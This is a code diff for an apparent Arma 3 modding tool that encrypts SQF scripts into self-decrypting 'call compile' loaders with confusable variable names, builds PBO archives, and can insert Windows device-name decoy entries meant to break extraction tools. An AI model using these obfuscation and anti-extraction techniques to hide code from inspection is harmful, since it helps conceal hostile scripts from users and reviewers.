+            // Pseudo-Random Generation Algorithm (PRGA) — Drop first 256 bytes
+            let i = 0;
+            j = 0;
+            for (let d = 0; d < 256; d++) {
+                i = (i + 1) % 256;
+                j = (j + S[i]) % 256;
+                const tmp = S[i];
+                S[i] = S[j];
+                S[j] = tmp;
+            }
+
+            // Encrypt/Decrypt payload via modular addition/subtraction:
+            // Why modular addition (p + k) % 256 instead of XOR?
+            // Because SQF does not have a native bitwise XOR operator in vanilla RV4 without bit-decomposition loops!
+            // Modular addition `(c + k) % 256` and decryption `(c - k + 256) % 256` executes in 1 native SQF instruction!
+            const out = new Array(byteArray.length);
+            for (let idx = 0; idx < byteArray.length; idx++) {
+                i = (i + 1) % 256;
+                j = (j + S[i]) % 256;
+                const tmp = S[i];
+                S[i] = S[j];
+                S[j] = tmp;
+                const k = S[(S[i] + S[j]) % 256];
+                out[idx] = (byteArray[idx] + k) % 256;
+            }
+            return out;
+        }
+
+        function rc4Drop256DecryptSimulation(cipherArray, keyString) {
+            const keyBytes = [];
+            for (let i = 0; i < keyString.length; i++) {
+                keyBytes.push(keyString.charCodeAt(i) & 0xFF);
+            }
+            if (keyBytes.length === 0) keyBytes.push(0x5A);
+
+            const S = new Array(256);
+            for (let i = 0; i < 256; i++) S[i] = i;
+            let j = 0;
+            for (let i = 0; i < 256; i++) {
+                j = (j + S[i] + keyBytes[i % keyBytes.length]) % 256;
+                const tmp = S[i];
+                S[i] = S[j];
+                S[j] = tmp;
+            }
+
+            let i = 0;
+            j = 0;
+            for (let d = 0; d < 256; d++) {
+                i = (i + 1) % 256;
+                j = (j + S[i]) % 256;
+                const tmp = S[i];
+                S[i] = S[j];
+                S[j] = tmp;
+            }
+
+            const plainBytes = new Array(cipherArray.length);
+            for (let idx = 0; idx < cipherArray.length; idx++) {
+                // Simulate Arma 3 Float32 arithmetic via Math.fround
+                i = Math.fround((i + 1) % 256);
+                j = Math.fround((j + S[i]) % 256);
+                const tmp = S[i];
+                S[i] = S[j];
+                S[j] = tmp;
+                const k = S[Math.fround((S[i] + S[j]) % 256)];
+                plainBytes[idx] = Math.fround((cipherArray[idx] - k + 256) % 256);
+            }
+            return plainBytes.map(b => String.fromCharCode(b)).join('');
+        }
+
+        function generatePolymorphicTokens(alphabetMode, count = 12) {
+            const tokens = [];
+            const used = new Set();
+            for (let idx = 0; idx < count; idx++) {
+                let tok = '_';
+                if (alphabetMode === 'il1') {
+                    const chars = ['I', 'l', '1'];
+                    tok += ['I', 'l'][idx % 2];
+                    for (let c = 0; c < 7; c++) tok += chars[(idx * 7 + c * 3) % chars.length];
+                } else if (alphabetMode === 'o0') {
+                    const chars = ['O', '0', 'o'];
+                    tok += ['O', 'o'][idx % 2];
+                    for (let c = 0; c < 7; c++) tok += chars[(idx * 5 + c * 2) % chars.length];
+                } else {
+                    tok = `_0x${((idx + 1) * 0x1A3F).toString(16).toUpperCase()}`;
+                }
+                while (used.has(tok)) tok += '1';
+                used.add(tok);
+                tokens.push(tok);
+            }
+            return tokens;
+        }
+
+        function runHardenedObfuscator() {
+            if (!aceObfInput || !aceObfOutput) return;
+            const rawSource = aceObfInput.getValue();
+            // Save edits back into active VFS file
+            if (vfsFiles[activeVfsIndex]) {
+                vfsFiles[activeVfsIndex].content = rawSource;
+            }
+
+            const halfA = document.getElementById('obfKeyHalfA').value.trim() || 'rv4_defaultA';
+            const halfB = document.getElementById('obfKeyHalfB').value.trim() || 'sv_defaultB';
+            const combinedKey = halfA + halfB;
+            const alphabetMode = document.getElementById('obfAlphabet').value;
+            const lockTarget = document.getElementById('obfLockTarget').value.trim();
+            const anti3DEN = document.getElementById('guardAnti3DEN').checked;
+            const useCompileFinal = document.getElementById('guardCompileFinal').checked;
+
+            document.getElementById('pboHeaderKeyPreview').textContent = halfA;
+
+            // Convert plaintext into UTF-8/ASCII safe byte array
+            const plainBytes = [];
+            for (let i = 0; i < rawSource.length; i++) {
+                plainBytes.push(rawSource.charCodeAt(i) & 0xFF);
+            }
+
+            const cipherBytes = rc4Drop256Transform(plainBytes, combinedKey);
+
+            // Run live Float32 roundtrip verification
+            const verifiedPlain = rc4Drop256DecryptSimulation(cipherBytes, combinedKey);
+            const isExactMatch = verifiedPlain === rawSource;
+            const badge = document.getElementById('obfRoundtripBadge');
+            if (isExactMatch) {
+                badge.className = "px-2.5 py-1 rounded-lg bg-emerald-500/15 border border-emerald-500/30 text-emerald-300 font-mono text-xs font-semibold";
+                badge.innerHTML = `<i class="fa-solid fa-circle-check mr-1"></i>Float32 Roundtrip Verified (${cipherBytes.length} B)`;
+            }
+
+            // Polymorphic variable names
+            const [vKey, vS, vI, vJ, vTmp, vOut, vPay, vK, vIdx, vD] = generatePolymorphicTokens(alphabetMode, 10);
+
+            // Build Guard clauses
+            let guards = '';
+            if (anti3DEN) {
+                guards += `if (is3DEN) exitWith {diag_log "[RV4-SEC] Eden Editor memory dump attempt blocked.";};\n`;
+            }
+            if (lockTarget) {
+                if (/^7656119\d{10}$/.test(lockTarget)) {
+                    // String comparison for 17-digit Steam64 UID (avoids IEEE-754 float32 truncation!)
+                    guards += `if (hasInterface && {getPlayerUID player != "${lockTarget}"}) exitWith {};\n`;
+                } else {
+                    guards += `if (worldName != "${lockTarget}" && {serverName != "${lockTarget}"}) exitWith {};\n`;
+                }
+            }
+
+            // 1. Standalone Hardened SQF Output
+            let standalone = `/*\n * RV4 HARDENED RC4-DROP256 PURE-INTEGER STREAM PAYLOAD (x64 IEEE-754 SAFE)\n * Max VM Scalar State: 765 << 16,777,216 (Zero Float32 Rounding Drift)\n */\n`;
+            standalone += `[] call {\n    ${guards}`;
+            standalone += `private ${vKey} = toArray ("${halfA}" + "${halfB}");\n`;
+            standalone += `    private ${vS} = []; ${vS} resize 256;\n`;
+            standalone += `    for "${vI}" from 0 to 255 do { ${vS} set [${vI}, ${vI}]; };\n`;
+            standalone += `    private ${vJ} = 0;\n`;
+            standalone += `    for "${vI}" from 0 to 255 do {\n`;
+            standalone += `        ${vJ} = (${vJ} + (${vS} select ${vI}) + (${vKey} select (${vI} % (count ${vKey})))) % 256;\n`;
+            standalone += `        private ${vTmp} = ${vS} select ${vI}; ${vS} set [${vI}, ${vS} select ${vJ}]; ${vS} set [${vJ}, ${vTmp}];\n`;
+            standalone += `    };\n`;
+            standalone += `    private ${vIdx} = 0; ${vJ} = 0;\n`;
+            standalone += `    for "${vD}" from 0 to 255 do {\n`;
+            standalone += `        ${vIdx} = (${vIdx} + 1) % 256; ${vJ} = (${vJ} + (${vS} select ${vIdx})) % 256;\n`;
+            standalone += `        private ${vTmp} = ${vS} select ${vIdx}; ${vS} set [${vIdx}, ${vS} select ${vJ}]; ${vS} set [${vJ}, ${vTmp}];\n`;
+            standalone += `    };\n`;
+            standalone += `    private ${vPay} = [${cipherBytes.join(',')}];\n`;
+            standalone += `    private ${vOut} = [];\n`;
+            standalone += `    {\n`;
+            standalone += `        ${vIdx} = (${vIdx} + 1) % 256; ${vJ} = (${vJ} + (${vS} select ${vIdx})) % 256;\n`;
+            standalone += `        private ${vTmp} = ${vS} select ${vIdx}; ${vS} set [${vIdx}, ${vS} select ${vJ}]; ${vS} set [${vJ}, ${vTmp}];\n`;
+            standalone += `        private ${vK} = ${vS} select (((${vS} select ${vIdx}) + (${vS} select ${vJ})) % 256);\n`;
+            standalone += `        ${vOut} pushBack ((_x - ${vK} + 256) % 256);\n`;
+            standalone += `    } forEach ${vPay};\n`;
+            if (useCompileFinal) {
+                standalone += `    ${vKey} resize 0; ${vKey} = nil; ${vS} resize 0; ${vS} = nil;\n`;
+                standalone += `    call compileFinal toString ${vOut};\n`;
+            } else {
+                standalone += `    call compile toString ${vOut};\n`;
+            }
+            standalone += `};`;
+
+            // 2. Companion @ServerKey preInit Bootstrapper Output
+            const prefix = document.getElementById('pboPrefixInput').value.trim();
+            let serverStub = `// ============================================================================\n`;
+            serverStub += `// @ServerKey ADDON BOOTSTRAPPER (CfgFunctions preInit = 1)\n`;
+            serverStub += `// Reconstructs Split-Key (Half-A from PBO Header + Half-B from Server Mod)\n`;
+            serverStub += `// ============================================================================\n\n`;
+            serverStub += `if (is3DEN) exitWith {diag_log "[RV4-SEC] Blocked Eden Editor VFS inspection";};\n\n`;
+            serverStub += `private _halfA = "${halfA}"; // Mirrors PBO sreV header property 'svn_rev'\n`;
+            serverStub += `private _halfB = "${halfB}"; // Server-held secret Half-B\n`;
+            serverStub += `private _combinedKey = toArray (_halfA + _halfB);\n\n`;
+            serverStub += `private _fn_decryptStream = {\n`;
+            serverStub += `    params ["_cipherBytes", "_keyArr"];\n`;
+            serverStub += `    private _S = []; _S resize 256;\n`;
+            serverStub += `    for "_i" from 0 to 255 do { _S set [_i, _i]; };\n`;
+            serverStub += `    private _j = 0;\n`;
+            serverStub += `    for "_i" from 0 to 255 do {\n`;
+            serverStub += `        _j = (_j + (_S select _i) + (_keyArr select (_i % (count _keyArr)))) % 256;\n`;
+            serverStub += `        private _t = _S select _i; _S set [_i, _S select _j]; _S set [_j, _t];\n`;
+            serverStub += `    };\n`;
+            serverStub += `    private _i = 0; _j = 0;\n`;
+            serverStub += `    for "_d" from 0 to 255 do {\n`;
+            serverStub += `        _i = (_i + 1) % 256; _j = (_j + (_S select _i)) % 256;\n`;
+            serverStub += `        private _t = _S select _i; _S set [_i, _S select _j]; _S set [_j, _t];\n`;
+            serverStub += `    };\n`;
+            serverStub += `    private _plain = [];\n`;
+            serverStub += `    {\n`;
+            serverStub += `        _i = (_i + 1) % 256; _j = (_j + (_S select _i)) % 256;\n`;
+            serverStub += `        private _t = _S select _i; _S set [_i, _S select _j]; _S set [_j, _t];\n`;
+            serverStub += `        private _k = _S select (((_S select _i) + (_S select _j)) % 256);\n`;
+            serverStub += `        _plain pushBack ((_x - _k + 256) % 256);\n`;
+            serverStub += `    } forEach _cipherBytes;\n`;
+            serverStub += `    compileFinal toString _plain\n`;
+            serverStub += `};\n\n`;
+            serverStub += `// Decrypt and lock VFS functions into missionNamespace:\n`;
+            serverStub += `{\n    _x params ["_fnVar", "_vfsPath"];\n`;
+            serverStub += `    private _cipherArr = call compile preprocessFile (format ["\\%1\\%2", "${prefix}", _vfsPath]);\n`;
+            serverStub += `    missionNamespace setVariable [_fnVar, [_cipherArr, _combinedKey] call _fn_decryptStream];\n`;
+            serverStub += `} forEach [\n`;
+            vfsFiles.filter(f => f.name.endsWith('.sqf')).forEach((f, idx, arr) => {
+                const fnName = 'RV4_fnc_' + f.name.split('\\').pop().replace(/^fn_|\.sqf$/g, '');
+                serverStub += `    ["${fnName}", "${f.name}"]${idx < arr.length - 1 ? ',' : ''}\n`;
+            });
+            serverStub += `];\n\n`;
+            serverStub += `// Wipe decryption key from memory before mission postInit:\n`;
+            serverStub += `_combinedKey resize 0; _combinedKey = nil; _halfA = nil; _halfB = nil;`;
+
+            lastStandaloneObfCode = standalone;
+            lastServerStubCode = serverStub;
+            aceObfOutput.setValue(currentObfView === 'standalone' ? lastStandaloneObfCode : lastServerStubCode, -1);
+            rebuildBinaryPboPreview();
+        }
+
+        function randomizeObfKeys() {
+            const randHex = (len) => Array.from({ length: len }, () => Math.floor(Math.random() * 16).toString(16)).join('');
+            document.getElementById('obfKeyHalfA').value = 'rv4_' + randHex(12);
+            document.getElementById('obfKeyHalfB').value = 'sv_' + randHex(12);
+            runHardenedObfuscator();
+            showToast('Generated new cryptographic Split-Keys (Half-A + Half-B)', 'amber');
+        }
+
+        function switchObfOutputView(view) {
+            currentObfView = view;
+            const btnStandalone = document.getElementById('btnObfViewStandalone');
+            const btnServer = document.getElementById('btnObfViewServerStub');
+            if (view === 'standalone') {
+                btnStandalone.className = "px-2.5 py-1 rounded text-[11px] font-mono font-semibold bg-amber-500 text-slate-950";
+                btnServer.className = "px-2.5 py-1 rounded text-[11px] font-mono text-slate-300 hover:bg-rv-bg";
+                aceObfOutput.setValue(lastStandaloneObfCode, -1);
+            } else {
+                btnServer.className = "px-2.5 py-1 rounded text-[11px] font-mono font-semibold bg-amber-500 text-slate-950";
+                btnStandalone.className = "px-2.5 py-1 rounded text-[11px] font-mono text-slate-300 hover:bg-rv-bg";
+                aceObfOutput.setValue(lastServerStubCode, -1);
+            }
+        }
+
+        function copyObfOutput() {
+            copyTextToClipboard(aceObfOutput.getValue(), 'Hardened SQF Output');
+        }
+
+        /*************************************************************************
+         * 4. BINARY .PBO COMPILER, SHA-1 TRAILER & HEX INSPECTOR
+         *************************************************************************/
+        /**
+         * Pure-JS synchronous SHA-1 implementation for the 20-byte Bohemia Interactive .PBO trailer
+         */
+        function computeSha1Bytes(uint8Data) {
+            const ml = uint8Data.length * 8;
+            const withOne = new Uint8Array(((uint8Data.length + 8 >> 6) + 1) << 6);
+            withOne.set(uint8Data);
+            withOne[uint8Data.length] = 0x80;
+            const dv = new DataView(withOne.buffer);
+            dv.setUint32(withOne.length - 4, ml, false);
+
+            let h0 = 0x67452301, h1 = 0xEFCDAB89, h2 = 0x98BADCFE, h3 = 0x10325476, h4 = 0xC3D2E1F0;
+            const w = new Int32Array(80);
+
+            for (let i = 0; i < withOne.length; i += 64) {
+                for (let j = 0; j < 16; j++) w[j] = dv.getInt32(i + j * 4, false);
+                for (let j = 16; j < 80; j++) {
+                    const n = w[j - 3] ^ w[j - 8] ^ w[j - 14] ^ w[j - 16];
+                    w[j] = (n << 1) | (n >>> 31);
+                }
+                let a = h0, b = h1, c = h2, d = h3, e = h4;
+                for (let j = 0; j < 80; j++) {
+                    let f, k;
+                    if (j < 20) { f = (b & c) | ((~b) & d); k = 0x5A827999; }
+                    else if (j < 40) { f = b ^ c ^ d; k = 0x6ED9EBA1; }
+                    else if (j < 60) { f = (b & c) | (b & d) | (c & d); k = 0x8F1BBCDC; }
+                    else { f = b ^ c ^ d; k = 0xCA62C1D6; }
+                    const temp = (((a << 5) | (a >>> 27)) + f + e + k + w[j]) | 0;
+                    e = d; d = c; c = (b << 30) | (b >>> 2); b = a; a = temp;
+                }
+                h0 = (h0 + a) | 0;
+                h1 = (h1 + b) | 0;
+                h2 = (h2 + c) | 0;
+                h3 = (h3 + d) | 0;
+                h4 = (h4 + e) | 0;
+            }
+
+            const digest = new Uint8Array(20);
+            const outDv = new DataView(digest.buffer);
+            outDv.setInt32(0, h0, false);
+            outDv.setInt32(4, h1, false);
+            outDv.setInt32(8, h2, false);
+            outDv.setInt32(12, h3, false);
+            outDv.setInt32(16, h4, false);
+            return digest;
+        }
+
+        function renderVfsFileList() {
+            const listEl = document.getElementById('vfsFileList');
+            listEl.innerHTML = vfsFiles.map((f, idx) => {
+                const isActive = idx === activeVfsIndex;
+                const isSqf = f.name.endsWith('.sqf');
+                return `<div onclick="selectVfsFile(${idx})" class="px-3.5 py-2.5 flex items-center justify-between cursor-pointer transition ${isActive ? 'bg-amber-500/15 border-l-2 border-amber-400 text-white' : 'text-slate-300 hover:bg-rv-surface'}">
+                    <div class="flex items-center gap-2 truncate">
+                        <i class="fa-regular ${isSqf ? 'fa-file-code text-amber-400' : 'fa-file-lines text-cyan-400'}"></i>
+                        <span class="truncate">${f.name}</span>
+                    </div>
+                    <div class="flex items-center gap-2">
+                        <span class="text-[10px] px-1.5 py-0.5 rounded ${isSqf ? 'bg-emerald-500/15 text-emerald-300' : 'bg-slate-800 text-slate-400'}">${isSqf ? 'RC4' : 'RAW'}</span>
+                        ${vfsFiles.length > 1 ? `<button onclick="deleteVfsFile(event, ${idx})" class="text-slate-500 hover:text-red-400"><i class="fa-solid fa-trash-can"></i></button>` : ''}
+                    </div>
+                </div>`;
+            }).join('');
+        }
+
+        function selectVfsFile(idx) {
+            if (vfsFiles[activeVfsIndex] && aceObfInput) {
+                vfsFiles[activeVfsIndex].content = aceObfInput.getValue();
+            }
+            activeVfsIndex = idx;
+            document.getElementById('activeVfsFileTitle').textContent = vfsFiles[idx].name;
+            aceObfInput.setValue(vfsFiles[idx].content, -1);
+            renderVfsFileList();
+            runHardenedObfuscator();
+        }
+
+        function addVirtualPboFile() {
+            const bar = document.getElementById('newVfsFileBar');
+            bar.classList.toggle('hidden');
+            document.getElementById('newVfsFileName').focus();
+        }
+
+        function confirmAddVirtualPboFile() {
+            const nameInput = document.getElementById('newVfsFileName');
+            const name = nameInput.value.trim().replace(/\//g, '\\');
+            if (!name) return;
+            vfsFiles.push({
+                name,
+                content: `// ${name}\nparams ["_args"];\ntrue`
+            });
+            nameInput.value = '';
+            document.getElementById('newVfsFileBar').classList.add('hidden');
+            selectVfsFile(vfsFiles.length - 1);
+            showToast(`Added ${name} to VFS table`, 'emerald');
+        }
+
+        function deleteVfsFile(event, idx) {
+            event.stopPropagation();
+            if (vfsFiles.length <= 1) return;
+            const removed = vfsFiles.splice(idx, 1)[0];
+            activeVfsIndex = Math.max(0, activeVfsIndex - 1);
+            selectVfsFile(activeVfsIndex);
+            showToast(`Removed ${removed.name}`, 'amber');
+        }
+
+        /**
+         * Builds a specification-compliant Bohemia Interactive .PBO binary archive in memory
+         */
+        function rebuildBinaryPboPreview() {
+            const prefix = document.getElementById('pboPrefixInput').value.trim() || 'x\\rv_protected\\addons\\core';
+            const halfA = document.getElementById('obfKeyHalfA').value.trim() || 'rv4_defaultA';
+            const halfB = document.getElementById('obfKeyHalfB').value.trim() || 'sv_defaultB';
+            const combinedKey = halfA + halfB;
+            const injectDecoys = document.getElementById('guardNtDecoys').checked;
+
+            const encoder = new TextEncoder();
+            const entriesMeta = [];
+            const dataBlocks = [];
+
+            // 1. Signature 'sreV' (0x56657273) Header Entry
+            const propsList = [
+                ['prefix', prefix],
+                ['svn_rev', halfA],
+                ['product', 'arma3_x64_rv4']
+            ];
+
+            entriesMeta.push({
+                filename: '',
+                packingMethod: 0x56657273, // 'sreV'
+                originalSize: 0,
+                reserved: 0,
+                timestamp: 0,
+                dataSize: 0,
+                role: 'sreV Header + Split Key Half-A',
+                props: propsList
+            });
+
+            // 2. Optional Anti-BankRev NT-Device Decoy Entries
+            if (injectDecoys) {
+                const decoys = ['AUX.sqf', 'COM1.fsm', 'LPT1.hpp'];
+                decoys.forEach((dName, dIdx) => {
+                    entriesMeta.push({
+                        filename: dName,
+                        packingMethod: 0x00000000,
+                        originalSize: 0,
+                        reserved: 0,
+                        timestamp: 0xFFFFFFFF - dIdx,
+                        dataSize: 0,
+                        role: 'NT-Device Anti-Extractor Trap'
+                    });
+                });
+            }
+
+            // 3. VFS Payload Entries (.sqf files are stream-encrypted into ASCII byte arrays)
+            const nowTs = Math.floor(Date.now() / 1000);
+            vfsFiles.forEach((f, idx) => {
+                let payloadText = f.content;
+                let role = 'Raw Config / Asset';
+                if (f.name.toLowerCase().endsWith('.sqf')) {
+                    const plainBytes = Array.from(f.content).map(c => c.charCodeAt(0) & 0xFF);
+                    const cipherBytes = rc4Drop256Transform(plainBytes, combinedKey);
+                    payloadText = `[${cipherBytes.join(',')}]`;
+                    role = 'RC4-Drop256 Encrypted Stream';
+                }
+                const encodedBytes = encoder.encode(payloadText);
+                entriesMeta.push({
+                    filename: f.name,
+                    packingMethod: 0x00000000,
+                    originalSize: encodedBytes.length,
+                    reserved: 0,
+                    timestamp: nowTs + idx,
+                    dataSize: encodedBytes.length,
+                    role
+                });
+                dataBlocks.push(encodedBytes);
+            });
+
+            // Calculate exact binary byte length of PBO header + data blocks
+            let headerByteLen = 0;
+            entriesMeta.forEach(e => {
+                headerByteLen += encoder.encode(e.filename).length + 1 + 20; // asciiz filename + 5 uint32s
+                if (e.props) {
+                    e.props.forEach(([k, v]) => {
+                        headerByteLen += encoder.encode(k).length + 1 + encoder.encode(v).length + 1;
+                    });
+                    headerByteLen += 1; // terminating \0 of sreV property list
+                }
+            });
+            headerByteLen += 21; // Final End-of-Header boundary entry (empty filename \0 + five 0 uint32s)
+
+            const totalDataLen = dataBlocks.reduce((acc, b) => acc + b.length, 0);
+            const bodyLen = headerByteLen + totalDataLen;
+            const pboBuffer = new Uint8Array(bodyLen + 21); // +21 for 0x00 + 20-byte SHA-1 trailer
+            const dv = new DataView(pboBuffer.buffer);
+
+            let offset = 0;
+            const writeAsciiz = (str) => {
+                const bytes = encoder.encode(str);
+                pboBuffer.set(bytes, offset);
+                offset += bytes.length;
+                pboBuffer[offset++] = 0x00;
+            };
+
+            entriesMeta.forEach(e => {
+                e.headerOffset = offset;
+                writeAsciiz(e.filename);
+                dv.setUint32(offset, e.packingMethod, true); offset += 4;
+                dv.setUint32(offset, e.originalSize, true); offset += 4;
+                dv.setUint32(offset, e.reserved, true); offset += 4;
+                dv.setUint32(offset, e.timestamp >>> 0, true); offset += 4;
+                dv.setUint32(offset, e.dataSize, true); offset += 4;
+
+                if (e.props) {
+                    e.props.forEach(([k, v]) => {
+                        writeAsciiz(k);
+                        writeAsciiz(v);
+                    });
+                    pboBuffer[offset++] = 0x00; // End of sreV properties
+                }
+            });
+
+            // End-of-Header boundary struct (21 zero bytes)
+            offset += 21;
+
+            // Write concatenated file data blocks
+            dataBlocks.forEach(block => {
+                pboBuffer.set(block, offset);
+                offset += block.length;
+            });
+
+            // Compute 20-byte SHA-1 checksum over [0 .. bodyLen-1]
+            const sha1Bytes = computeSha1Bytes(pboBuffer.subarray(0, bodyLen));
+            pboBuffer[offset++] = 0x00;
+            pboBuffer.set(sha1Bytes, offset);
+
+            lastCompiledPboBytes = pboBuffer;
+
+            // Update UI badges & tables
+            const sha1Hex = Array.from(sha1Bytes).map(b => b.toString(16).padStart(2, '0')).join('');
+            document.getElementById('pboSha1Preview').textContent = sha1Hex;
+            document.getElementById('pboSizeBadge').textContent = `${pboBuffer.length.toLocaleString()} Bytes`;
+            document.getElementById('pboEntryCountBadge').textContent = `${entriesMeta.length} Header Structs`;
+
+            const tbody = document.getElementById('pboHeaderTableBody');
+            tbody.innerHTML = entriesMeta.map((e, i) => {
+                const mime = e.packingMethod === 0x56657273
+                    ? `<span class="text-amber-400 font-bold">0x56657273 ('sreV')</span>`
+                    : `<span class="text-slate-400">0x00000000 (Uncomp)</span>`;
+                const roleBadge = e.role.includes('Trap')
+                    ? `<span class="px-1.5 py-0.5 rounded bg-red-500/15 text-red-300 border border-red-500/30">${e.role}</span>`
+                    : e.role.includes('RC4')
+                    ? `<span class="px-1.5 py-0.5 rounded bg-emerald-500/15 text-emerald-300 border border-emerald-500/30">${e.role}</span>`
+                    : `<span class="px-1.5 py-0.5 rounded bg-cyan-500/15 text-cyan-300 border border-cyan-500/30">${e.role}</span>`;
+                return `<tr class="hover:bg-rv-surface/50">
+                    <td class="py-1.5 px-3 text-slate-500">0x${e.headerOffset.toString(16).padStart(4, '0')}</td>
+                    <td class="py-1.5 px-3 text-white font-semibold">${e.filename || '<span class="text-amber-400">[NULL // sreV Root]</span>'}</td>
+                    <td class="py-1.5 px-3">${mime}</td>
+                    <td class="py-1.5 px-3 text-slate-400">0x${(e.timestamp >>> 0).toString(16).toUpperCase()}</td>
+                    <td class="py-1.5 px-3 text-cyan-300">${e.dataSize} B</td>
+                    <td class="py-1.5 px-3">${roleBadge}</td>
+                </tr>`;
+            }).join('');
+
+            // Render Hex Dump of the first 256 bytes of the PBO
+            document.getElementById('pboHexDumpView').textContent = formatHexDump(pboBuffer.subarray(0, Math.min(320, pboBuffer.length)));
+        }
+
+        function downloadCompiledPbo() {
+            if (!lastCompiledPboBytes) rebuildBinaryPboPreview();
+            downloadBlob(lastCompiledPboBytes, 'rv4_protected_mission.pbo', 'application/octet-stream');
+        }
+
+        /**
+         * Parses an uploaded binary .PBO file from disk and populates the VFS inspector
+         */
+        function handlePboFileUpload(event) {
+            const file = event.target.files[0];
+            if (!file) return;
+            const reader = new FileReader();
+            reader.onload = (e) => {
+                const bytes = new Uint8Array(e.target.result);
+                const dv = new DataView(bytes.buffer);
+                const decoder = new TextDecoder('utf-8');
+                let offset = 0;
+
+                const readAsciiz = () => {
+                    let start = offset;
+                    while (offset < bytes.length && bytes[offset] !== 0) offset++;
+                    const str = decoder.decode(bytes.subarray(start, offset));
+                    offset++; // skip \0
+                    return str;
+                };
+
+                const parsedEntries = [];
+                while (offset + 21 <= bytes.length) {
+                    const filename = readAsciiz();
+                    const packingMethod = dv.getUint32(offset, true); offset += 4;
+                    const originalSize = dv.getUint32(offset, true); offset += 4;
+                    const reserved = dv.getUint32(offset, true); offset += 4;
+                    const timestamp = dv.getUint32(offset, true); offset += 4;
+                    const dataSize = dv.getUint32(offset, true); offset += 4;
+
+                    if (packingMethod === 0x56657273) {
+                        // Read sreV properties until empty string
+                        while (offset < bytes.length && bytes[offset] !== 0) {
+                            const k = readAsciiz();
+                            const v = readAsciiz();
+                            if (k.toLowerCase() === 'prefix') {
+                                document.getElementById('pboPrefixInput').value = v;
+                            } else if (k.toLowerCase() === 'svn_rev') {
+                                document.getElementById('obfKeyHalfA').value = v;
+                            }
+                        }
+                        offset++; // skip terminating \0
+                        continue;
+                    }
+
+                    // End of header check
+                    if (filename === '' && packingMethod === 0 && dataSize === 0) {
+                        break;
+                    }
+
+                    parsedEntries.push({ filename, packingMethod, originalSize, timestamp, dataSize });
+                }
+
+                // Extract non-zero text files into VFS table
+                const newVfs = [];
+                for (const ent of parsedEntries) {
+                    if (ent.dataSize > 0 && offset + ent.dataSize <= bytes.length) {
+                        const fileSlice = bytes.subarray(offset, offset + ent.dataSize);
+                        offset += ent.dataSize;
+                        newVfs.push({
+                            name: ent.filename,
+                            content: decoder.decode(fileSlice)
+                        });
+                    }
+                }
+
+                if (newVfs.length > 0) {
+                    vfsFiles = newVfs;
+                    selectVfsFile(0);
+                    showToast(`Unpacked ${newVfs.length} VFS files from ${file.name}`, 'emerald');
+                } else {
+                    showToast(`Parsed PBO header from ${file.name} (${parsedEntries.length} entries)`, 'cyan');
+                }
+            };
+            reader.readAsArrayBuffer(file);
+        }
+
+        function formatHexDump(uint8Slice) {
+            let lines = [];
+            for (let i = 0; i < uint8Slice.length; i += 16) {
+                const chunk = uint8Slice.subarray(i, i + 16);
+                const hexPart = Array.from(chunk).map(b => b.toString(16).padStart(2, '0').toUpperCase()).join(' ');
+                const asciiPart = Array.from(chunk).map(b => (b >= 32 && b <= 126) ? String.fromCharCode(b) : '.').join('');
+                lines.push(`${i.toString(16).padStart(4, '0').toUpperCase()}  ${hexPart.padEnd(47, ' ')}  |${asciiPart}|`);
+            }
+            return lines.join('\n');
+        }
+
+        /*************************************************************************
+         * 5. WORKBENCH 3: BOHEMIA \0raP BINARY SYNTHESIZER, DECOMPILER & SQM EXPORTER
+         *************************************************************************/
+        /**
+         * Writes a Bohemia Interactive 7-bit CompressedInt into a byte array
+         */
+        function writeBisCompressedInt(arr, val) {
+            let v = val >>> 0;
+            do {
+                let byte = v & 0x7F;
+                v >>>= 7;
+                if (v > 0) byte |= 0x80;
+                arr.push(byte);
+            } while (v > 0);
+        }
+
+        /**
+         * Synthesizes a genuine Bohemia Interactive `\0raP` (0x00 0x72 0x61 0x50) binary stream
+         * so users can immediately test the binary decompiler on real byte structures.
+         */
+        function buildSampleRapBinary(kind = 'config') {
+            const bytes = [];
+            const pushByte = (b) => bytes.push(b & 0xFF);
+            const pushUint32 = (u) => {
+                bytes.push(u & 0xFF, (u >>> 8) & 0xFF, (u >>> 16) & 0xFF, (u >>> 24) & 0xFF);
+            };
+            const pushFloat32 = (f) => {
+                const buf = new ArrayBuffer(4);
+                new DataView(buf).setFloat32(0, f, true);
+                const u8 = new Uint8Array(buf);
+                bytes.push(u8[0], u8[1], u8[2], u8[3]);
+            };
+            const pushAsciiz = (str) => {
+                for (let i = 0; i < str.length; i++) bytes.push(str.charCodeAt(i) & 0xFF);
+                bytes.push(0x00);
+            };
+
+            // 1. Magic Signature: \0raP (0x00, 0x72, 0x61, 0x50)
+            pushByte(0x00); pushByte(0x72); pushByte(0x61); pushByte(0x50);
+            // 2. always_0 (0x00000000) and always_8 (0x00000008)
+            pushUint32(0);
+            pushUint32(8);
+            // 3. Placeholder for offsetToEnums
+            const enumOffsetPos = bytes.length;
+            pushUint32(0);
+
+            if (kind === 'config') {
+                // Root Class Body: Inherited "", 4 root packets (ExternClass, DeleteClass, Subclass CfgPatches, Subclass CfgVehicles)
+                pushAsciiz(""); // root parent class
+                writeBisCompressedInt(bytes, 4); // 4 entries in root class
+
+                // Entry 1: Packet Type 3 (ExternClass) -> class RscStandardDisplay;
+                pushByte(3);
+                pushAsciiz("RscStandardDisplay");
+
+                // Entry 2: Packet Type 4 (DeleteClass) -> delete Legacy_2016_Crypter;
+                pushByte(4);
+                pushAsciiz("Legacy_2016_Crypter");
+
+                // Entry 3: Packet Type 0 (RapClass) -> class CfgPatches
+                pushByte(0);
+                pushAsciiz("CfgPatches");
+                const cfgPatchesPtrPos = bytes.length;
+                pushUint32(0);
+
+                // Entry 4: Packet Type 0 (RapClass) -> class CfgFunctions
+                pushByte(0);
+                pushAsciiz("CfgFunctions");
+                const cfgFncPtrPos = bytes.length;
+                pushUint32(0);
+
+                // Write CfgPatches Class Body
+                const cfgPatchesBodyOffset = bytes.length;
+                const patchUint32 = (pos, val) => {
+                    bytes[pos] = val & 0xFF;
+                    bytes[pos + 1] = (val >>> 8) & 0xFF;
+                    bytes[pos + 2] = (val >>> 16) & 0xFF;
+                    bytes[pos + 3] = (val >>> 24) & 0xFF;
+                };
+                patchUint32(cfgPatchesPtrPos, cfgPatchesBodyOffset);
+
+                pushAsciiz(""); // inherits nothing
+                writeBisCompressedInt(bytes, 4); // 4 entries in CfgPatches
+
+                // ValueEq String: author = "RV4 Engineering Workbench";
+                pushByte(1); pushByte(0);
+                pushAsciiz("author");
+                pushAsciiz("RV4 Engineering Workbench");
+
+                // ValueEq Float32: requiredVersion = 2.18;
+                pushByte(1); pushByte(1);
+                pushAsciiz("requiredVersion");
+                pushFloat32(2.18);
+
